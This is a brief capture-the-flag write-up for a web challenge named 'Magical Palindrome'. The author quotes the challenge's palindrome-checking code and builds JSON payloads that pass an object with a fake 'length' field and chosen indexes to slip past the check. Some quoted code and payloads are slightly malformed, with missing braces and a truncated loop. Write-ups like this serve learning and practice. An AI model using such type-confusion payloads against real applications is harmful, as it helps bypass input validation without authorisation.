# Magical Palindrome
After completing the initial reconnaissance of the challenge, it became clear that the only meaningful logic was implemented client-side. By reviewing the JavaScript code, I identified how the application validated the submitted value in order to determine whether it was a palindrome.

The relevant portion of the code is shown below:
<img width="597" height="259" alt="image" src="https://github.com/user-attachments/assets/35a88a3f-cdf1-46b5-b5dc-ced95723b8b9" />

This was the only validation layer, so the objective was to bypass it.

The first condition is 
```bash
if (string.length < 1000)
```

My first attempt was:
```bash
{"palindrome":{"length": "1000"}
```

The second condition is 
```bash
for (const i of Array(string.length).keys()) {
const original = string[i];
const reverse = string[string.length - i - 1];
if (original !== reverse || typeof original !== 'string')
}
```

So If a create a JSON with {"palindrome":{"length": "1000"} the response will be similar to 
```bash
stirng[0] =
string[1000-0-1]=
```
To satisfy the palindrome check, at minimum the first and last characters needed to match, so I expanded the JSON object:
```bash
{"palindrome":{"length": "1000","0":"x","999":"x"}
```
